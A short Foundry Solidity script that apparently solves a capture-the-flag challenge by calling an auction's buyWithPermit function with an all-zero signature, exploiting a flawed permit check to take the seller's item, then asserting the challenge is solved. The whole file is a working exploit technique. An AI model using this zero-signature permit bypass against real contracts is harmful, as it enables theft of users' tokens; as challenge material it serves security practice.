// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

import {Challenge} from "src/Challenge.sol";
import {IAuction} from "src/interfaces/IAuction.sol";

contract SolveScript is Script {
    Challenge challenge = Challenge(0xf1868e910Cafe57263305C2f632615C9C564306C);
    IAuction auction = challenge.auction();

    function run() public {
        vm.startBroadcast();

        auction.buyWithPermit(auction.seller(), msg.sender, 0, block.timestamp, uint8(0), bytes32(0), bytes32(0));
        assert(challenge.isSolved());

        vm.stopBroadcast();
    }
}
